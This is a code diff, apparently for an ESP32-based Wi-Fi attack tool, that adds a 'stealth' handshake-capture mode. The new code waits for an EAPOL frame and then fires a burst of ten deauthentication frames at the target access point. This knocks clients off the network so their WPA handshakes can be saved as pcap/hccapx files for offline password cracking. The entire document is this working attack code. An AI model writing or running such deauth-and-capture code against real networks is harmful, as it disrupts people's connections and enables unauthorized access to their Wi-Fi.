@@ -22,6 +22,7 @@
 #include "frame_analyzer.h"
 #include "pcap_serializer.h"
 #include "hccapx_serializer.h"
+#include "wsl_bypasser.h"
 
 static const char *TAG = "main:attack_handshake";
 static attack_handshake_methods_t method = -1;
@@ -45,6 +46,14 @@ static void eapolkey_frame_handler(void *args, esp_event_base_t event_base, int3
     attack_append_status_content(frame->payload, frame->rx_ctrl.sig_len);
     pcap_serializer_append_frame(frame->payload, frame->rx_ctrl.sig_len, frame->rx_ctrl.timestamp);
     hccapx_serializer_add_frame((data_frame_t *) frame->payload);
+    
+    // Stealth mode: send deauth burst when EAPOL detected
+    if (method == ATTACK_HANDSHAKE_METHOD_STEALTH && ap_record != NULL) {
+        ESP_LOGI(TAG, "[STEALTH] EAPOL detected - sending deauth burst!");
+        for (int i = 0; i < 10; i++) {
+            wsl_bypasser_send_deauth_frame(ap_record);
+        }
+    }
 }
 
 void attack_handshake_start(attack_config_t *attack_config){
@@ -70,6 +79,10 @@ void attack_handshake_start(attack_config_t *attack_config){
             ESP_LOGD(TAG, "ATTACK_HANDSHAKE_METHOD_PASSIVE");
             // No actions required. Passive handshake capture
             break;
+        case ATTACK_HANDSHAKE_METHOD_STEALTH:
+            ESP_LOGD(TAG, "ATTACK_HANDSHAKE_METHOD_STEALTH");
+            // Stealth: no initial deauth, trigger on EAPOL detection
+            break;
         default:
             ESP_LOGD(TAG, "Method unknown! Fallback to ATTACK_HANDSHAKE_METHOD_PASSIVE");
     }
@@ -86,6 +99,9 @@ void attack_handshake_stop(){
             break;
         case ATTACK_HANDSHAKE_METHOD_PASSIVE:
             // No actions required.
+            break;
+        case ATTACK_HANDSHAKE_METHOD_STEALTH:
+            // No cleanup needed for stealth mode
             break;
         default:
             ESP_LOGE(TAG, "Unknown attack method! Attack may not be stopped properly.");
